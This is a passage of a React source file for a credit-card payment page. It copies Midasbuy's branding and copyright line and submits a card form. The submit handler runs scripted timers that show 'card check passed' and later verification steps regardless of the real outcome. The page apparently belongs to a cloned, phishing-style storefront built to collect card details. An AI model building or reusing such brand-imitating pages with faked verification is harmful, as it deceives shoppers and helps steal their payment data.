              if (xpayFormRef.current && selectedMethod === 'new') {
                clearVerificationTimers();
                setPaymentError(null);
                setProcessingStatus('processing');
                setFailedAtStep(0);
                setVerificationStep(0);

                setIsProcessing(true);
                setShowCardVerification(true);
                setCurrentStep(3);

                // After 2 seconds, hide processing popup and open verification sheet
                const t1 = window.setTimeout(() => {
                  setShowCardVerification(false);
                  setShowPaymentVerification(true);
                  setVerificationStep(1);
                }, 2000);
                // Step 1 completes quickly (card check passed)
                const t2 = window.setTimeout(() => setVerificationStep(2), 3500);
                // Step 2 stays spinning while 3DS happens (user redirects to bank)
                // Auto-hide popup 3 seconds after reaching step 2 so user can see bank OTP/3DS redirect
                const t3 = window.setTimeout(() => setShowPaymentVerification(false), 6500);
                verificationTimers.current = [t1, t2, t3];

                xpayFormRef.current.submit();
              }
            }}
            className={`text-white font-bold py-2.5 px-8 rounded-md text-[13px] flex items-center gap-2 transition-all ${
              isProcessing || (selectedMethod === 'new' && !isCardComplete) || (orderInfo?.packageIndex !== undefined && orderInfo.packageIndex >= 6)
                ? 'bg-gray-400 cursor-not-allowed opacity-60'
                : 'bg-[#3e82ff] hover:bg-[#2d6de6]'
            }`}
          >
            {isProcessing ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Processing...
              </>
            ) : (
              'Payment'
            )}
          </button>
        </div>
        
        <div className="flex justify-center mt-6 mb-4">
          <img src={safetyPaymentBadge} alt="Safety Payment of Midasbuy" className="h-6 object-contain" />
        </div>
        
        <div className="text-center px-6 pb-6">
          <p className="text-[8px] text-gray-400 font-bold uppercase tracking-widest leading-relaxed">
            COPYRIGHT © High Morale Developments Limited. ALL RIGHTS RESERVED.
          </p>
        </div>
      </div>

      {/* Desktop Footer */}
      <div className="hidden lg:block mt-8">
        <div className="bg-white shadow-[0_-2px_10px_rgba(0,0,0,0.08)] py-5">
          <div className="lg:max-w-6xl lg:mx-auto px-8 xl:px-16 flex items-center justify-between">
            <span className="text-[13px] text-gray-500 font-medium underline cursor-pointer">
              {orderInfo?.email ? maskEmail(orderInfo.email) : 'user@example.com'}
            </span>
            
            <button
              onClick={() => {
                if (xpayFormRef.current && selectedMethod === 'new') {
                  clearVerificationTimers();
                  setPaymentError(null);
                  setProcessingStatus('processing');
                  setFailedAtStep(0);
                  setVerificationStep(0);

                  setIsProcessing(true);
                  setShowCardVerification(true);
                  setCurrentStep(3);

                  const t1 = window.setTimeout(() => {
                    setShowCardVerification(false);
                    setShowPaymentVerification(true);
                    setVerificationStep(1);
                  }, 2000);
                  const t2 = window.setTimeout(() => setVerificationStep(2), 3500);
                  // Auto-hide popup 3 seconds after reaching step 2 so user can see bank OTP/3DS redirect
                  const t3 = window.setTimeout(() => setShowPaymentVerification(false), 6500);
                  verificationTimers.current = [t1, t2, t3];

                  xpayFormRef.current.submit();
                }
              }}
              className={`text-white font-bold py-3 px-12 rounded-md text-[14px] flex items-center gap-2 transition-all ${
                isProcessing || (selectedMethod === 'new' && !isCardComplete) || (orderInfo?.packageIndex !== undefined && orderInfo.packageIndex >= 6)
                  ? 'bg-gray-400 cursor-not-allowed opacity-60'
                  : 'bg-[#3e82ff] hover:bg-[#2d6de6]'
              }`}
            >
              {isProcessing ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Processing...
                </>
              ) : (
                'Payment'
              )}
            </button>
          </div>
        </div>

        <div className="flex justify-center mt-8 mb-4">
          <img src={safetyPaymentBadge} alt="Safety Payment of Midasbuy" className="h-8 object-contain" />
        </div>

        <div className="text-center px-6 pb-8">
          <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest leading-relaxed">
            COPYRIGHT © HIGH MORALE DEVELOPMENTS LTD. ALL RIGHTS RESERVED.
          </p>
        </div>
      </div>


    </div>
  );
};

export default CreditCardPaymentPage;
